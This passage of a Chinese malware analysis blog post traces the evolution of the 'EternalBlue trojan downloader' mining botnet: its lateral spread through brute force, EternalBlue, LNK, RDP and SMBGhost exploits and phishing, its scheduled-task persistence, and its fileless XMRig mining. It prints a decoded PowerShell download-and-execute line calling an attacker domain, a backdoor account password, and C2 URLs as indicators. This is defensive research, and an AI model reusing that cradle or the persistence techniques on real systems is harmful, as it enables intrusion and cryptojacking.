+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160259.png"></p>
+<p>​    将抓取到的用户机器的域名、用户名、密码等信息保存到同目录下mkatz.ini文件中，格式如下图所示，所以若局域网中存在使用相同密码的机器，很容易被一网打尽，修改默认密码的重要性不言而喻。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160330.png"></p>
+<ol start="5">
+<li>利用PsExec工具完成对被攻陷机器的远程控制，远程控制会去验证账户k8h3d并进行判断，如果已经感染成功，就会进行远程cmd执行，包括但不限于创建计划任务下载Payload、检测恶意组件、运行恶意组件等行为。</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160355.png"></p>
+<ol start="6">
+<li>扫描网络中开放有1433端口(SQL Server)的主机，尝试用弱密码进行登录，若成功则利用SQLServer服务在目标主机中添加一个标志性的账户k8h3d，此账户密码为k8d3j9SjfS7</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160405.png"></p>
+<p>​    另外还会创建名为Bluetooths的计划任务，该计划任务通过bypass的方式绕过本地权限利用cmd执行base64加密的powershell来执行下一阶段任务：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160447.png"></p>
+<p>​    该计划任务就是在被攻陷机器中开始新攻击的重要入口，计划任务每隔50分钟执行一次powershell脚本，该脚本作用为下载并执行下一阶段攻击程序， 上图中加密powershell解密后，内容如下，：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell  <span class="literal">-ep</span> bypass –e <span class="built_in">IEX</span>(<span class="built_in">New-Objects</span> Net.WebClinet).downloadstring(<span class="string">&quot;http://v.beahh.com/v&quot;</span>+<span class="variable">$env:USERDOMAIN</span>)</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><p>新传播模块也会进行一些信息收集操作，统计的信息包括本地网卡mac地址、杀软信息、系统版本、感染标志、当前用户组、当前用户名等，其用于对感染信息的统计和后续的控制下发，上传信息的地址列表如下：</p>
+<p><code>hxxp://info[.]haqo.net/e.png</code></p>
+<p><code>hxxp://info[.]beahh.com/e.png</code></p>
+<p><code>hxxp://info[.]abbny.com/e.png</code></p>
+</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160609.png"></p>
+<h2 id="01-入侵之后的后续攻击-前置准备"><a href="#01-入侵之后的后续攻击-前置准备" class="headerlink" title="01 入侵之后的后续攻击-前置准备"></a>01 入侵之后的后续攻击-前置准备</h2><p>​    入侵新机器成功后，会通过上述计划任务Bluetooths下载powershell脚本并加载到内存中执行，这里将其命名为v.ps1,捕获到多份经过多次混淆(至少4次)的powersehll脚本：</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th align="center">MD5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>v.ps1</td>
+<td align="center">95adf923ba32cc5004277867181680c8</td>
+</tr>
+<tr>
+<td>v.ps1</td>
+<td align="center">55f0dd8c306db9fc8b9e45705cd66598</td>
+</tr>
+<tr>
+<td>v.ps1</td>
+<td align="center">c17cdee1afdc272a46b1cf25c1f44dcc</td>
+</tr>
+</tbody></table>
+<p>​    从时间线来看，最初版本的脚本是在19年2月22被发现的v(95adf923ba32cc5004277867181680c8)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160737.png"></p>
+<p>​    该脚本是一个最初的测试版本，有如下一系列功能，其暂时未配置无文件挖矿功能：</p>
+<ol>
+<li> 通过WMI查询当前计算机信息，包括MAC地址、所有杀软信息，另外会检测是否存在杀软主动防御服务，完成后睡眠一段时间：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160818.png"></p>
+<ol start="2">
+<li>通过WMI检测列表中所有的系统进程是否运行，运行则关闭对应进程，并在之后清除对应进程文件，用于之后恶意样本对进程替换达到隐藏恶意攻击的目的：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160842.png"></p>
+<p>检查的系统进程如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160854.png"></p>
+<ol start="3">
+<li><p>将收集到信息进行拼接，并判断如下三个标志文件的存在状态，来更新对应的exe传播模块，该版本攻击手法中，依旧存在用于传播的exe组件：<code>C:\Users\ADMINI~1\AppData\Local\Temp\tmplog.tmp</code></p>
+<p><code>C:\Users\ADMINI~1\AppData\Local\Temp\tmplog2.tmp</code></p>
+<p><code>C:\Windows\随机八位数字名称.exe</code></p>
+<p>若检测到不存在tmplog2.tmp，则循环查询C:\Windows\下的所有命名格式随机八位数字名称.exe的文件，创建以其文件名命名的计划任务来持久化运行。</p>
+<p>若检测到不存在tmplog.tmp，则会去如下URL：<code>hxxp://d[.\]beahh.com/update.png?p=11](http://d.beahh.com/update.png?p=11)</code> 处对传播模块exe进行更新，获取新的样本到C:\Windows\随机八位数字名称.exe，并创建对应的计划任务进行持久化执行：</p>
+</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160941.png"></p>
+<ol start="4">
+<li><p>继续执行，稍后从URL：</p>
+<p><code>hxxp://172[.]104.177.202/new.dat?11+信息+状态 </code></p>
+<p>处获取powershell脚本到C:\ProgramData\Microsoft\cred.ps1，然后加载到内存中执行，同时创建名为Credentials的计划任务，定时启动该文件cred.ps1：</p>
+</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161114.png"></p>
+<p>​    创建的计划任务Credentials如下图所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161129.png"></p>
+<p>​    而从2019年2日开始，最新版本的v.ps1进行下发，新版包括了无文件挖矿的powershell脚本：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161244.png"></p>
+<p>​    样本中执行流程会依据C:\Users\ADMINI~1\AppData\Local\Temp下的几个不同日志文件存在状态来控制后续PayLoad的下发，具体文件和行为如下：</p>
+<p><strong>kkk1.log：</strong></p>
+<p>​    不存在创建以mac地址命名的计划任务，操作为从url：hxxp://v[.]y6h.net/g?h+当前时间 请求下载后续PayLoad加载到内存中直接执行：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161326.png"></p>
+<p>​    计划任务如下图所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161342.png"></p>
+<p>​    下载到的Payload为g(4ec29049ac81521c37dad2da6754d6a3)，解混淆后，主要完成了收集mac地址、杀软信息、感染版本、系统版本、用户名等信息并上传到服务器，用于获取到后续脚本：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161357.png"></p>
+<p><strong>pp2.log：</strong></p>
+<p>​    不存在行为和上述测试版设置计划任务，运行下载的cred.ps1相同，不同之处在于domain进行了改变，新domain为down[.]beahh.com：：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161420.png"></p>
+<p><strong>333.log：</strong></p>
+<p>​    不存在则从<code>hxxp://down[.]beahh.com/mn.dat?allv5</code>处下载mn.dat存储为mn.exe，然后加载运行，该模块就是最初的挖矿模块<strong>。</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161440.png"></p>
+<p><strong>kk4.log：</strong></p>
+<p>​    不存在则从<code>hxxp://down[.]beahh.com/ii.dat?p=allv5</code>处下载ii.dat，命名为4~8个随机字母.exe，该模块就是上述的ii.exe传播模块：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161501.png"></p>
+<p><strong>ps5.log：</strong></p>
+<p>​    在这里不同版本的脚本开始出现区别，在4月2号的样本中，该文件不存在则从hxxp://down[.]beahh.com/ddd.dat?allv5处下载ddd.dat，存储为ddd.exe，该模块为新版的利用了显卡驱动相关的挖矿模块：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161526.png"></p>
+<p>​    而在4月3号的样本中，该步骤被去掉，新增了依据当前系统版本下载对应的d64.dat或d32.dat脚本并直接在内存中执行的流程，下载的脚本为powershell无文件挖矿脚本：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161541.png"></p>
+<h2 id="02-入侵之后的后续攻击-无文件挖矿"><a href="#02-入侵之后的后续攻击-无文件挖矿" class="headerlink" title="02 入侵之后的后续攻击-无文件挖矿"></a>02 入侵之后的后续攻击-无文件挖矿</h2><p>​    这里以捕获到的d64.ps1样本进行分析说明，信息如下：</p>
+<table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="center">MD5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">d64.dat</td>
+<td align="center">c90ecc4e12e085c7fbc571d9ba6d00d4</td>
+</tr>
+</tbody></table>
+<p>​    解混淆后，脚本具体功能分析如下，该类型无文件挖矿脚本都是如下所示的流程：</p>
+<ol>
+<li>XMRig挖矿木马脚本被使用Base64编码保存：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029164952.png"></p>
+<ol start="2">
+<li>初始化Invoke-ReflectivePEInjection(内存中执行PE)</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161630.png"></p>
+<ol start="3">
+<li>经过一系列配置操作后，调用Invoke-ReflectivePEInjection将代码加载到内存中执行：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161640.png"></p>
+<ol start="4">
+<li>运行后，进行挖矿，矿池为52[.]139.168.125，运行状态如下图所示，此时版本为2.14.0，后续该挖矿脚本也会随时间的推移逐步更新：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161659.png"></p>
+<h2 id="03-入侵之后的后续攻击-传播模块"><a href="#03-入侵之后的后续攻击-传播模块" class="headerlink" title="03 入侵之后的后续攻击-传播模块"></a>03 入侵之后的后续攻击-传播模块</h2><p>​    上述准备阶段下载到的所有powershell中，cred.ps1为后续攻击的开始powershell，这里捕获到两份相关的文件：</p>
+<table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="center">MD5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">cred.ps1(V1)</td>
+<td align="center">31ce6662be59ca4c01c1730bc7150f19</td>
+</tr>
+<tr>
+<td align="center">cred.ps1(V5)</td>
+<td align="center">e05827e44d487d1782a32386123193ef</td>
+</tr>
+</tbody></table>
+<p>​    两份powershell脚本都经过了4次加密混淆，主要区别在于版本不同，这里用最新到的v5版本的样本进行行为说明，cred.ps1(V5)脚本结构大致如下图所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161743.png"></p>
+<p>​    该版本的传播模块与上文中分析的老版本相比最重要的区别是开始利用IEX直接加载到内存中执行的，从而完成了无文件攻击的方式。当然其在一些攻击细节方面也进行了调整优化，比如：</p>
+<ol>
+<li>调用永恒之蓝漏洞攻击：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161824.png"></p>
+<p>​    对于不同的系统进行了不同的定制化操作，其中eb7函数主要针对Win 7、Windows2008、Windows vista、windows 2011，eb8函数主要针对win10、win 8、windows 2012。</p>
+<p><strong>eb7函数：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161900.png">****</p>
+<p><strong>eb8函数：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161908.png"></p>
+<ol start="2">
+<li>新SMB弱口令爆破密码：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161936.png"></p>
+<p>​    攻击完成后，将FlashPlayer.lnk和flashplayer.tmp植入到目标机器并设置菜单启动目录进行新一轮的攻击：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161955.png"></p>
+<ol start="5">
+<li>循环进行版本更新，从hxxp://p[.]beahh.com/upgrade.php?ver=5&amp;mac=处获取更新信息：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162023.png"></p>
+<p>​    通过对比发现，该脚本和Mykings僵尸网络变种木马使用到的攻击手法有很多类似，比如包括相同的攻击函数eb7()、eb8()，创建的计划任务都为%appdata%\Microsoft目录下，都会在攻击成功后对目标机器上传文件设置菜单启动项等。</p>
+<h1 id="4-不断更新的攻击组件"><a href="#4-不断更新的攻击组件" class="headerlink" title="4. 不断更新的攻击组件"></a>4. 不断更新的攻击组件</h1><p>​    从19年4月开始，”永恒之蓝木马下载器”系列木马开始稳定的利用上述计划任务+powershell的无文件方式进行传播与攻击。之后对攻击组件和挖矿脚本依旧进行着频繁的更新，使其攻击能力和挖矿能力不断提升。其中对于域名和PoweShell脚本名称也进行了多次更改，其中使用到了DGA算法进行域名的生成，而windows下的攻击组件名称也变为了if.bin，近期攻击方式整理为下图所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162102.png"></p>
+<p>​    其中在最新获取的if.bin传播模块中，攻击组件完成攻击后，远程在目标机上执行的命令部分如下，主要攻击方式为通过最新的Domain(如：t[.]zz3r0.com、t[.]zer9g.com、t[.]amynx.com、t[.]ackng.com)下载对应的PowerShell脚本并加载到内存执行攻击：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162117.png"></p>
+<p>​    截至20年10月，该系列木马现有的攻击手段包括但不限于下图中的所有攻击方式：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162138.png"></p>
+<h2 id="00-再次变化的传播方式分析"><a href="#00-再次变化的传播方式分析" class="headerlink" title="00 再次变化的传播方式分析"></a>00 再次变化的传播方式分析</h2><p>​    上图所述的所有攻击方式，只要有一种可以完成入侵任务，那么传播过程就会继续向下蔓延，通过在目标机上远程对诸如上述的ipc.jsp、ms.jsp、usb.jsp、mail.jsp、smgh.jsp(也叫做ipc.bin、ms.bin等)等等一系列以对应攻击方式来命名的脚本文件进行下载和执行，来完成新的传播。这里对该类脚本主要完成操作进行简要说明：</p>
+<ol>
+<li>会利用WMI命令检测常见杀软，并对其进行卸载：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162236.png"></p>
+<ol start="2">
+<li>创建计划任务blackball以及三个名称随机和路径随机的计划任务：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162251.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162302.png"></p>
+<p>​    计划任务用于启动powershell执行如下图所示的脚本，用于下载新的前置准备模块a.jsp，我们留待稍后解释：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162319.png"></p>
+<ol start="3">
+<li>利用netsh.exe设置防火墙相关的规则：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162337.png"></p>
+<h2 id="01-新的攻击前准备模块a-jsp"><a href="#01-新的攻击前准备模块a-jsp" class="headerlink" title="01 新的攻击前准备模块a.jsp"></a>01 新的攻击前准备模块a.jsp</h2><p>​    该模块近期下载C2为t[.]amynx.com，该文件也有多个版本的变迁，这里通过其中版本较新的一份样本对主要行为进行分析，样本信息如下：</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>MD5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>a.jsp</td>
+<td>ff75c064248579f4bdabec6d6dba89d6</td>
+</tr>
+</tbody></table>
+<p>​    该样本主要完成了对于如下介绍的一些传播模块和挖矿模块进行下载，是最新的攻击前置准备模块，具体行为如下，其中函数SIEX为封装的下载并执行脚本函数：</p>
+<ol>
+<li>会在对应条件满足情况下对传播模块进行下载，下载的传播模块有Windows下的传播模块if.bin和Linux下的传播模块kr.bin，内置传播模块信息如下，用于验证 ：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162458.png"></p>
+<ol start="2">
+<li>依据系统版本不同，下载对应的32/64位挖矿程序me3.exe/m6.bin(经检测32位暂时没有下载)。另外对于存在独立显卡(N卡/A卡)的主机，会下载显卡挖矿脚本m6g.bin同时进行挖矿，内置挖矿脚本信息如下，用于验证：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162525.png"></p>
+<ol start="3">
+<li>如果主机有N卡，则同时会下载XMRig的CUDA插件到%AppData%\temp\nvdg.dat，用于支持显卡挖矿：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162542.png"></p>
+<ol start="4">
+<li>检测当前机器Outlook存在状态，据此下载钓鱼邮件相关的攻击组件if_mail.bin并执行，该组件后面进行分析说明：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162603.png"></p>
+<ol start="5">
+<li>依据temp目录下的日志文件kk4kk.log存在状态，来进行ode.bin脚本的下载执行：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162622.png"></p>
+<p>​    ode.bin主要完成了对20.dat的下载，下载IP为167.99.154.202，命名为4到8位随机字符组成字串.exe。然后创建同名计划任务定时启动样本，或者通过计划任务定时启动tt.vbs脚本，再通过脚本启动样本来完成持久化操作：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162638.png"></p>
+<p>​    </p>
+<p>​    该样本(ef3a4697773f84850fe1a086db8edfe0)和最开始所述的未加签名的python传播模块类似，包含了永恒之蓝攻击、MSSQL爆破攻击、IPC$爆破攻击、SMB爆破攻击等，猜测其可能是为了对越来越复杂的传播模块进行攻击组件的切割，为其后续的某些行为做准备。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162711.png"></p>
+<h2 id="02-无文件攻击新添加组件说明"><a href="#02-无文件攻击新添加组件说明" class="headerlink" title="02 无文件攻击新添加组件说明"></a>02 无文件攻击新添加组件说明</h2><p>​    “永恒之蓝木马下载器”系列木马的更新是一个频繁且长久的过程，要想完整的对更新链进行详细描述，怕是能讲三天三夜。所以这里我们长话短说，重点着墨于其关键更新的节点，对后续添加的攻击组件及其行为进行分析说明。</p>
+<ol>
+<li><p>Lnk漏洞攻击添加:</p>
+<p>紧接上述的无文件挖矿模块被添加之后，在19年7月19日，检测到攻击组件又被进行了扩展，添加了Lnk漏洞(CVE-2017-8464)相关的攻击.</p>
+<p>首先会检测可移动设备和网络共享盘存在状态，然后向检测到的目标盘目录中释放木马文件blue3.bin、blue6.bin、readme.js，以及带漏洞的Lnk文件:</p>
+</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162834.png"></p>
+<p>​    释放木马及Lnk文件部分代码如下图所示，其释放的Lnk文件，文件名为D ~K开头+任意一个释放的木马文件文件名，用于执行同目录下的木马文件：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162901.png"></p>
+<p>​    CVE-2017-8464漏洞可怕之处在于其只要打开了Lnk文件所在目录就已经进行了恶意操作的执行，其会去下载usb.jsp进行后续攻击。</p>
+<ol start="2">
+<li>在19年10月9日检测到攻击组件对于RDP远程执行漏洞(CVE-2019-0708)的添加，完成了对于该漏洞的检测上报，依旧利用该漏洞进行横向传播，攻击成功后远程执行命令下载rdp.jsp到目标机中直接执行。</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162916.png"></p>
+<ol start="3">
+<li>20年4月开始，攻击组件中加入了钓鱼邮件的传播方式，邮件附件doc中包含了office远程代码执行漏洞(CVE-2017-8570），邮件内容和Covid-19(新冠病毒)相关，关键的攻击代码在if_mail.bin脚本中，会通过当前用户的Outlook邮箱进行邮件的发送。其中部分邮件相关信息如下：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162935.png"></p>
+<p>​    当被攻击用户运行doc文档后，会触发漏洞下载执行后续脚本mail.jsp。</p>
+<p>​    此时也增加了一个小组件BypasUAC，其在脚本7p.jsp中，部分代码如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162950.png"></p>
+<ol start="4">
+<li>20年5月21号检测到SMBGhost漏洞(CVE-2020-0796)相关的组件添加，以及SSH爆破攻击相关组件添加，在后续对它们进行了利用，攻击成功后也会远程下载对应的后续脚本smbh.jsp和ssh.jsp并执行。</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029163008.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029163018.png"></p>
+<ol start="5">
+<li><p>另外还有部分攻击组件包括Linux攻击，从20年6月10左右开始新增，也将其攻击代码列举如下：</p>
+<p>IPC$攻击，攻击完成后远程下载对应脚本ipc.jsp并执行：</p>
+</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029163034.png"></p>
+<p>​    Redis未授权访问漏洞攻击，攻击完成后远程下载对应脚本red.jsp并执行</p>
+<p><img src="C:\Users\hskul\AppData\Roaming\Typora\typora-user-images\image-20211029163046827.png" alt="image-20211029163046827"></p>
+<p>​    Yarn未授权访问漏洞，攻击Linux服务器集群，完成后运行挖矿木马：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029163056.png"></p>
+<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><p>​    本文粗略分析了”永恒之蓝木马下载器”各个阶段所使用的攻击手段。虽然文章结束了，但是该挖矿病毒的演化还在继续。</p>
+<p>​    从上文的分析来看，该病毒作者采用了各种常见的攻击方式来传播该病毒，导致此病毒有极强的传播能力。这也是为何本文一开始说该病毒在内网的流行度可以作为内网安全性的一个指标。</p>
